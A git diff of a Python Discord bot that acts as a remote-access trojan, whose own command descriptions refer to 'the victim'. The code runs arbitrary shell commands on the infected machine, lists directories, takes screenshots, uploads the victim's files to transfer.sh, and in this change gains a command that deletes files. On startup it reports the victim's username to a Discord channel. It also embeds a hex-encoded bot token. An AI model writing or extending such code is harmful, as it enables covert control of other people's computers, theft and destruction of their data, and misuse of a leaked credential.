@@ -1,11 +1,13 @@
 import os
+import os.path
 import time
 from os.path import join, exists
-from random import choice
+
 import discord
 import pyautogui
 import requests
 from discord import *
+from discord.utils import get
 
 global Token
 Token = "\x4d\x54\x41\x78\x4e\x44\x63\x77\x4e\x7a\x51\x33\x4e\x6a\x67\x35\x4e\x54\x45\x78\x4e\x7a\x4d\x33\x4e\x41\x2e\x47\x53\x34\x57\x58\x50\x2e\x72\x41\x37\x62\x6d\x4a\x67\x4d\x6a\x52\x32\x78\x34\x70\x44\x35\x67\x30\x4d\x52\x69\x47\x72\x74\x73\x47\x74\x66\x6d\x2d\x63\x4b\x79\x63\x6e\x42\x46\x73"
@@ -26,18 +28,21 @@ bot = Control()
 
 @bot.event
 async def on_ready():
-	print(f"logged in as [{bot.user}]")
+	# print(f"logged in as [{bot.user}]")
+	username = os.getenv("USERNAME")
+	for guild in bot.guilds:
+		channel = get(guild.text_channels, name="d")
+		await channel.send(f"@everyone `{username}` started `{__file__}` <:control:1029794910695596074>")
 
 
 @bot.tree.command(name="cmd", description="execute command in cmd")
 async def cmd(interaction: discord.Interaction, command: str):
-	await interaction.response.send_message(f"executing command {command}...")
+	await interaction.response.send_message(f"executing command `{command}`...")
 	x = os.popen(command).read()
 	if x == "":
 		await interaction.channel.send("Command doesn't return anything/isn't valid")
 	else:
 		await interaction.channel.send(f"command `{command}` returned:\n ```{x}```")
-
 
 @bot.tree.command(name="listdir", description="list all files in a specific directory (use %user% instead of username)")
 async def cmd(interaction: discord.Interaction, directory: str):
@@ -56,35 +61,44 @@ async def scr(interaction: discord.Interaction):
 	os.remove(path)
 
 
-@bot.tree.command(name="download", description="download a file of the victim (use %user% instead of username)")
+@bot.tree.command(name="upload",
+description="upwnload a file of the victim to transfer.sh (use %user% instead of username)")
 async def scr(interaction: discord.Interaction, locinput: str):
 	await interaction.response.send_message(f"searching for `{locinput}`...")
 	await interaction.channel.send(transfer(locinput))
-	# await interaction.channel.send_message(f"found `{input}`, uploading to...")
+
+
+@bot.tree.command(name="delete", description="delete a file of the victim (use %user% instead of username)")
+async def scr(interaction: discord.Interaction, locinput: str):
+	await interaction.response.send_message(f"searching for `{locinput}`...")
+	await interaction.channel.send(delete(locinput))
+
+
+def delete(Filelocation: str):
+	Filelocation = Filelocation.casefold().replace("%user%", os.getenv("USERNAME"))
+	Filelocation = Filelocation.casefold().replace("%username%", os.getenv("USERNAME"))
+	if exists(Filelocation):
+		os.remove(Filelocation)
+		output = f"File `{Filelocation}` deleted"
+	else:
+		output = f"File `{Filelocation}` not found"
+	return output
 
 
 def transfer(Filelocation: str):
-	lowercase = 'abcdefghijklmnopqrstuvwxyz'
-	uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
-	allLetters = lowercase + uppercase
 	Filelocation = Filelocation.casefold().replace("%user%", os.getenv("USERNAME"))
 	Filelocation = Filelocation.casefold().replace("%username%", os.getenv("USERNAME"))
 
 	if exists(Filelocation):
-		random = "".join(choice(allLetters) for i in range(10))
-
-		file = {"file": (Filelocation, open(Filelocation, mode='rb'))}
-		upload = requests.post("https://transfer.sh/", files=file)
-		output = upload.text
-
-		print(output)
+		fileToUpload = {"file": (Filelocation, open(Filelocation, mode='rb'))}
+		r = requests.post("https://transfer.sh/", files=fileToUpload)
+		output = r.text
 	else:
 		output = f"File {Filelocation} not found"
 	return output
 
 
 def doScreenshot():
-	img = pyautogui.screenshot()
 	name = time.strftime("%Y%m%d-%H%M%S.jpg")
 	path = join(os.getenv("TEMP"), name)
 	img = pyautogui.screenshot(path)
